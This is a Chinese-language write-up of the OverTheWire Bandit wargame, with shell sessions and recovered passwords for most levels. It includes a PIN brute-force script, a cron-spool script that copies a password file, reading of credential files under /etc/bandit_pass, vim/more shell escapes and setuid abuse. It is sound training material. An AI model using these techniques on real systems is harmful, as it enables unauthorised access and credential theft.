/usr/bin/cronjob_bandit23.sh &> /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname > /tmp/$mytarget bandit22@bandit:/etc/cron.d$ \u62ff\u5230\u811a\u672c\u4ee5\u540e\u76f4\u63a5\u6267\u884c\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7528\u6237\u662fbandit23\uff0c\u56e0\u4e3awhoami\u8f93\u51fa\u7684\u662fbandit22 bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G level24 \u8fd8\u662f\u90a3\u51e0\u6b65\uff0c\u7136\u540e\u770b\u5230\u4e86\u8fd9\u73a9\u610f\u513f bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo || exit 1 echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i fi rm -rf ./$i fi done bandit23@bandit:/var/spool/bandit24$ ll total 12 dr-xr-x--- 3 bandit24 bandit23 4096 Apr 23 18:04 ./ drwxr-xr-x 5 root root 4096 Apr 23 18:04 ../ drwxrwx-wx 13 root bandit24 4096 Jul 17 06:58 foo/ bandit23@bandit:/var/spool/bandit24$ # \u8fd9\u91cc\u6211\u6839\u672c\u6ca1\u6709\u5199\u7684\u6743\u9650\uff0c\u9898\u6539\u4e86\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f \u90a3\u4e5f\u7b80\u5355\uff0c\u5c31\u662f\u628a\u811a\u672c\u653e\u5728foo\u5e95\u4e0b \u811a\u672c\u5c31\u662f\u4e00\u4e2a\u8f93\u51fa\uff0c\u6c34\u7684\u4e00\u6279 #!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/bandit23/pass \u7136\u540e\u6267\u884c\u811a\u672c\u5c31\u884c\uff0c\u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar level25 \u8981\u5199\u7206\u7834\u811a\u672c bandit24@bandit:~$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. ^C bandit24@bandit:~$ \u811a\u672c\u5982\u4e0b\uff1a #! /bin/bash pass24=\"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar\" for i in {0..9}{0..9}{0..9}{0..9} do echo $pass24' '$i >> mydict done echo \"done loop!\" cat ./mydict | nc localhost 30002 >> re sort re | uniq -u \u4e0a\u8fb9\u513f\u6709\u4e2a\u9898\u8c8c\u4f3c\u5e94\u8be5\u7528-u\u7684\uff0cG \u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d level26 \u767b\u9646\u4e0a\u4ee5\u540e\u51fa\u73b0\u5982\u4e0b\u5185\u5bb9\uff1a bandit25@bandit:~$ ll total 32 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 bandit25 bandit25 33 Apr 23 18:04 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Apr 23 18:04 bandit26.sshkey -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit25 bandit25 4 Apr 23 18:04 .pin -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit25/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$ \u8fd9\u4e00\u6b65\u9700\u8981\u77e5\u9053etc/passwd\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6709\u4e2a \u4e2d\u6587\u535a\u5ba2 bandit25@bandit:~$ cat /etc/passwd | grep \"bandit26\" bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 bandit25@bandit:~$ \u53d1\u73b0\u4f7f\u7528more\u5c55\u793a\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u628a\u7a97\u53e3\u7f29\u5c0f\uff0c\u8ba9\u4ed6\u4e00\u4e0b\u5b50\u5c55\u793a\u4e0d\u5b8c\u9700\u8981\u7ffb\u9875\u5373\u53ef\uff0c\u7136\u540e\u8fdb\u5165vim\u6a21\u5f0f\u5c31\u53ef\u4ee5\u8fdb\u884c\u641c\u7d22\u554a\u3001\u7f16\u8f91\u554a\u4e4b\u7c7b\u7684\u4e8b\u4e86\uff0c\u5c31\u89e3\u51b3\u4e86\u3002 :r /etc/bandit_pass/bandit26 c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1 level27 \u8fd9\u4e00\u9898\u548clevel26\u4e00\u6837\uff0c\u8fd8\u5f97\u7f29\u5c0fterminal\uff0c\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684\u7f51\u4e0a\u7684\u9898\u89e3\u3002 :set shell sh=/bin/sh :sh $ ll /bin/sh: 1: ll: not found $ ls -al total 44 drwxr-xr-x 3 root root 4096 Apr 23 18:04 . drwxr-xr-x 70 root root 4096 Apr 23 18:05 .. -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile drwxr-xr-x 2 root root 4096 Apr 23 18:04 .ssh -rwsr-x--- 1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do -rw-r----- 1 bandit26 bandit26 258 Apr 23 18:04 text.txt $ file bandit27-do bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped $ ./bandit27-do Run a command as another user. Example: ./bandit27-do id $ ./bandit27-do cat /etc/bandit_pass/bandit27 YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS level28 \u4f7f\u7528git\u4ed3\u5e93 bandit27@bandit:/tmp/a$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit27/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit27-git@localhost's password: remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (3/3), done. bandit27@bandit:/tmp/a$ ll total 10564 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwx-wt 317 root root 10801152 Jul 19 02:08 ../ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 repo/ bandit27@bandit:/tmp/a$ cd repo/ bandit27@bandit:/tmp/a/repo$ ll total 16 drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./ drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ../ drwxrwxr-x 8 bandit27 bandit27 4096 Jul 19 02:08 .git/ -rw-rw-r-- 1 bandit27 bandit27 68 Jul 19 02:08 README bandit27@bandit:/tmp/a/repo$ cat README The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR bandit27@bandit:/tmp/a/repo$ level29 \u8fd8\u662f\u8001\u89c4\u77e9 bandit28@bandit:/tmp/b$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo Cloning into 'repo'... The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit28/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit28-git@localhost's password: remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), done. Resolving deltas: 100% (2/2), done. bandit28@bandit:/tmp/b$ cd repo/ bandit28@bandit:/tmp/b/repo$ ll total 16 drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ./ drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ../ drwxrwxr-x 8 bandit28 bandit28 4096 Jul 19 02:11 .git/ -rw-rw-r-- 1 bandit28 bandit28 111 Jul 19 02:11 README.md bandit28@bandit:/tmp/b/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx bandit28@bandit:/tmp/b/repo$ git log commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD) Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 fix info leak commit abcff758fa6343a0d002a1c0add1ad8c71b88534 Author: Morla Porla <morla@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 add missing data commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78 Author: Ben Dover <noone@overthewire.org> Date: Sun Apr 23 18:04:39 2023 +0000 initial commit of README.md \u8fd9\u662f\u5178\u578b\u7684git\u6cc4\u9732 bandit28@bandit:/tmp/b/repo$ git diff 899b abcf diff --git a/README.md b/README.md index 5c6457b..b302105 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S bandit28@bandit:/tmp/b/repo$ level30 \u4e0b\u8f7d\u4e0b\u6765\u4ee5\u540e\uff0c\u4e00\u5f00\u59cb\u4ee5\u4e3a\u662fstash\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u662f\uff0c\u90a3\u4e48\u67e5\u770b\u522b\u7684\u5206\u652f\u3002 bandit29@bandit:/tmp/c/repo$ git stash list bandit29@bandit:/tmp/c/repo$ git branch -a * master remotes/origin/HEAD -> origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev bandit29@bandit:/tmp/c/repo$ \u7136\u540e\u5207\u6362\u5206\u652f\u5373\u53ef bandit29@bandit:/tmp/c/repo$ git checkout dev Branch 'dev' set up to track remote branch 'dev' from 'origin'. Switched to a new branch 'dev' bandit29@bandit:/tmp/c/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS bandit29@bandit:/tmp/c/repo$ level31 \u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u7f51\u4e0a\u7684\u7b54\u6848\uff0c\u8fd9\u73a9\u610f\u513f\u53eb\u5f15\u7528\uff0c\u8fd9\u91cc\u662f Git Pro\u6559\u7a0b bandit30@bandit:/tmp/d/repo$ git show-ref 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/heads/master 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/HEAD 59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master 831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret bandit30@bandit:/tmp/d/repo$ git show 831a OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt bandit30@bandit:/tmp/d/repo$ level32 push\u6587\u4ef6 bandit31@bandit:/tmp/d/repo$ git add -f ./key.txt bandit31@bandit:/tmp/d/repo$ git commit -m \"add key.txt\" [master 462b8a5] add key.txt 1 file changed, 1 insertion(+) create mode 100644 key.txt bandit31@bandit:/tmp/d/repo$ git push The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit31/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit31-git@localhost's password: Enumerating objects: 4, done. Counting objects: 100% (4/4), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done. Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo ! [remote rejected] master -> master (pre-receive hook declined) error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo' bandit31@bandit:/tmp/d/repo$ level33 \u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684 \u7b54\u6848 >> $0 $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy \u5f69\u86cb\u4e86 bandit33@bandit:~$ cat README.txt Congratulations on solving the last level of this game! At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels! In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know! bandit33@bandit:~$ \u5b8c\u7ed3\u6492\u82b1","title":"bandit"},{"location":"WarGame/bandit/#level0-ssh","text":"ssh bandit0@bandit.labs.overthewire.org -p 2220 # \u7136\u540e\u8f93\u5165\u5bc6\u7801\u5373\u53ef \u987a\u5229\u62ff\u5230\u63d0\u793a\u7b26","title":"level0 ssh\u8fdc\u7a0b\u767b\u5f55"},{"location":"WarGame/bandit/#level1","text":"\u8981\u6c42\u4f7f\u7528cat\u547d\u4ee4\uff0c\u6c34 bandit0@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit1 bandit0 33 Apr 23 18:04 readme bandit0@bandit:~$ cat readme NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL bandit0@bandit:~$","title":"level1"},{"location":"WarGame/bandit/#level2","text":"\u5904\u7406\u540d\u5b57\u53eb\u201c-\u201d\u7684\u6587\u4ef6\uff0c\u8fd9\u4e2a\u7531\u4e8e\u4f1a\u548c\u53c2\u6570\u89e3\u6790\u6df7\u4e86\uff0c\u6211\u7684\u5904\u7406\u529e\u6cd5\u662f\u52a0\u4e0a\u201c./\u201d bandit1@bandit:~$ ll total 24 -rw-r----- 1 bandit2 bandit1 33 Apr 23 18:04 - drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit1@bandit:~$ cat ./- rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi bandit1@bandit:~$","title":"level2"},{"location":"WarGame/bandit/#level3","text":"\u5904\u7406\u540d\u5b57\u91cc\u6709\u7a7a\u683c\u7684\u6587\u4ef6\uff0c\u76f4\u63a5\u62ff\u53cc\u5f15\u53f7\u5305\u8d77\u6765\u5373\u53ef bandit2@bandit:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile -rw-r----- 1 bandit3 bandit2 33 Apr 23 18:04 spaces in this filename bandit2@bandit:~$ cat \"spaces in this filename\" aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG bandit2@bandit:~$","title":"level3"},{"location":"WarGame/bandit/#level4","text":"\u5904\u7406\u6587\u4ef6\u5939\uff0c\u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662fcd\u8fdb\u53bb\u518d\u5904\u7406\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u9636\u6bb5\u8fd8\u4e0d\u6d89\u53ca\u7edd\u5bf9\u8def\u5f84\u3001\u76f8\u5bf9\u8def\u5f84\u4e4b\u7c7b\u7684\u6982\u5ff5\uff0c\u4f46\u662f\u6211\u61d2\u4e86 \u53e6\u5916\uff0c\u8fd8\u6709\u4e2a\u5904\u7406\u9690\u85cf\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528ls -l\u547d\u4ee4\uff0c\u5728\u5927\u591a\u6570bash\u4e2d\u4f1a\u628als -al\u5199\u6210\u522b\u540dll \u4e5f\u53ef\u4ee5\u4f7f\u7528ls -a bandit3@bandit:~$ ll total 24 drwxr-xr-x 3 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc drwxr-xr-x 2 root root 4096 Apr 23 18:04 inhere/ -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit3@bandit:~$ ls inhere/ bandit3@bandit:~$ ll inhere/ total 12 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit4 bandit3 33 Apr 23 18:04 .hidden bandit3@bandit:~$ cat ./inhere/.hidden 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe bandit3@bandit:~$","title":"level4"},{"location":"WarGame/bandit/#level5","text":"bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ll total 48 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 3 root root 4096 Apr 23 18:04 ../ -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file00 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file01 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file02 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file03 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file04 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file05 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file06 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file07 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file08 -rw-r----- 1 bandit5 bandit4 33 Apr 23 18:04 -file09 bandit4@bandit:~/inhere$ cat ./-file06 '\ufffdwk^j\ufffd\ufffdM\ufffd;,\ufffdco9bandit4@bandit:~/inhere$ # \u4f7f\u7528reset\u540e bandit4@bandit:~/inhere$ cat ./-file07 lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR bandit4@bandit:~/inhere$ \u8fd9\u91cc \u6709\u4e00\u4e2a\u8bb2\u4e86reset\u548cclear\u7684\u533a\u522b\uff0c\u5f88\u7b80\u5355","title":"level5"},{"location":"WarGame/bandit/#level6","text":"\u633a\u9ebb\u70e6\u7684\u4e00\u4e2a\u9e21\u513f\u9898 bandit5@bandit:~/inhere$ cd maybehere07 bandit5@bandit:~/inhere/maybehere07$ ll total 56 drwxr-x--- 2 root bandit5 4096 Apr 23 18:04 ./ drwxr-x--- 22 root bandit5 4096 Apr 23 18:04 ../ -rwxr-x--- 1 root bandit5 3663 Apr 23 18:04 -file1* -rwxr-x--- 1 root bandit5 3065 Apr 23 18:04 .file1* -rw-r----- 1 root bandit5 2488 Apr 23 18:04 -file2 -rw-r----- 1 root bandit5 1033 Apr 23 18:04 .file2 -rwxr-x--- 1 root bandit5 3362 Apr 23 18:04 -file3* -rwxr-x--- 1 root bandit5 1997 Apr 23 18:04 .file3* -rwxr-x--- 1 root bandit5 4130 Apr 23 18:04 spaces file1* -rw-r----- 1 root bandit5 9064 Apr 23 18:04 spaces file2 -rwxr-x--- 1 root bandit5 1022 Apr 23 18:04 spaces file3* bandit5@bandit:~/inhere/maybehere07$ cat .file2 P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU \u8fd9\u91cc\u9700\u8981\u77e5\u9053ll\u8f93\u51fa\u7684\u8fd9\u4e00\u5927\u5806\u90fd\u662f\u5565\u73a9\u610f\u513f\uff0crwx\u5206\u522b\u4ee3\u8868\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff0c\u5269\u4e0b\u7684\u770b\u6587\u6863\u5427\u3002","title":"level6"},{"location":"WarGame/bandit/#level7","text":"\u8981\u4f7f\u7528find\u4e86 # \u6211cd\u5230\u6839\u76ee\u5f55\u4e5f\u6ca1\u600e\u4e48\u53d1\u73b0\uff0c\u56e0\u6b64\u76f4\u63a5find\u641c\u7d22\u4e86\uff0c\u8fd8\u633a\u5feb\u7684\uff0c\u6309\u7406\u8bf4linux\u81ea\u5e26\u8fd9\u4e9b\u7834\u73a9\u610f\u513f\u4e0d\u8be5\u8fd9\u4e48\u5feb\u7684\u3002\u3002\u3002 bandit6@bandit:/$ find / -type f -size 33c -user bandit7 -group bandit6 2>/dev/null /var/lib/dpkg/info/bandit7.password bandit6@bandit:/$ cat /var/lib/dpkg/info/bandit7.password z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S \u90a3\u4e2a\u659c\u6760\u662f\u6307\u5b9a\u4e3a\u6839\u76ee\u5f55\uff0c\u7136\u540e\u5c31\u662f\u5927\u5c0f\u3001\u7528\u6237\u3001\u7ec4\uff0c\u6700\u540e\u6709\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u5230\u9ed1\u6d1e\uff0c\u4e0d\u5199\u4e5f\u6ca1\u4e8b\u513f\uff0c\u6211\u4e60\u60ef\u4e86","title":"level7"},{"location":"WarGame/bandit/#level8","text":"\u8fd9\u4e2a\u5c31\u662fgrep bandit7@bandit:~$ find / -type f -name \"data.txt\" -exec grep -l \"million\" {} \\; 2>/dev/null /home/bandit7/data.txt bandit7@bandit:~$ grep \"millionth\" data.txt millionth TESKZC0XvTetK0S9xNwm25STk5iWrBvP \u5176\u5b9e\u53e6\u4e00\u4e2a\u529e\u6cd5\u662f\u6253\u5f00\u6587\u4ef6\u7136\u540e\u7528vim\u7684\u641c\u7d22\uff0c\u6211\u8bd5\u4e86\u8bd5\u4e5f\u633a\u5feb\u7684","title":"level8"},{"location":"WarGame/bandit/#level9","text":"\u7528\u4e00\u4e0bsort\u5373\u53ef bandit8@bandit:~$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit9 bandit8 33033 Apr 23 18:04 data.txt -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit8@bandit:~$ sort data.txt | uniq -c | sort -n | head -n1 1 EN632PlfYiZbn3PhVK3XOGSlNInNE00t bandit8@bandit:~$","title":"level9"},{"location":"WarGame/bandit/#level10","text":"\u597d\u50cf\u662f\u6b63\u5219\uff0c\u6211\u4e0d\u592a\u4f1a\uff0c\u8349\u8349\u5199\u4e86\u4e9b bandit9@bandit:~$ strings data.txt | grep -oE \"==.*\" ========== the# ========== password ========== is ========== G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s bandit9@bandit:~$","title":"level10"},{"location":"WarGame/bandit/#level11","text":"base64\u89e3\u7801 bandit10@bandit:~$ cat data.txt | base64 -d The password is 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM bandit10@bandit:~$","title":"level11"},{"location":"WarGame/bandit/#level12","text":"\u4f7f\u7528tr \u4e07\u5e78\u67e5\u4e86\u4e00\u4e0b\uff0c\u5dee\u70b9\u513f\u5199\u4e2a\u811a\u672c\u3002\u3002\u3002 bandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M' The password is 